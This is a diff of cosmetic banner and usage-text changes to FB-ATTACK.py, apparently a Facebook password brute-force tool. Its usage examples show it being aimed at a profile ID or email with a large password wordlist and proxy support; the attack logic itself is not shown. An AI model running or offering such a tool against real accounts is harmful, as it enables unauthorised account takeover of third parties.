@@ -104,13 +104,13 @@ class FaceBoom(object):
         proxystatus = gr+self.useProxy+wi+"["+gr+"ON"+wi+"]" if self.useProxy  else yl+"["+rd+"OFF"+yl+"]"
         print(gr+"""
 ==================================
-[---] """+wi+"""WHITEDH4CKER"""+gr+"""  [---]
+[---]  """ + wi + """ WHITEDH4CKER """ + gr + """  [---]
 ==================================
-[---]  """+wi+"""FB-BRUTEFORCE"""+gr+""" [---]
+[---]  """ + wi + """ FB-BRUTEFORCE """ + gr + """ [---]
 ==================================
-[---]         """+yl+"""CONFIG"""+gr+""" [---]
+[---]         """ + yl + """ CONFIG """ + gr + """ [---]
 ==================================
-[>] Target      :> """+wi+target+gr+"""
+[>] Target      :> """ + wi+target + gr + """
 {}""".format("[>] Wordlist    :> "+yl+str(wordlist) if not single_passwd else "[>] Password    :> "+yl+str(single_passwd))+gr+"""
 [>] ProxyStatus :> """+str(proxystatus)+wi)
         if not single_passwd:
@@ -183,15 +183,15 @@ if __name__ == "__main__":
 parse = optparse.OptionParser(wi+"""
             Usage: python FB-ATTACK.py -t "target_id" -w "wordlist_location" 
    Examples:
-     |-------->
+     |--------->
      | python FB-ATTACK.py -g https://facebook.com/target_profile_url_for_get_id
-     |-------->
+     |--------->
      | python FB-ATTACK.py -t 100001013078780 -w 10MPASS.txt 
-     |-------->
+     |--------->
      | python FB-ATTACK.py -t target@gmail.com -w 10MPASS.txt
      |-------->
      |python FB-ATTACK.py -t target@gmail.com -s checkpassword
-     |-------->
+     |--------->
 """)
 
 
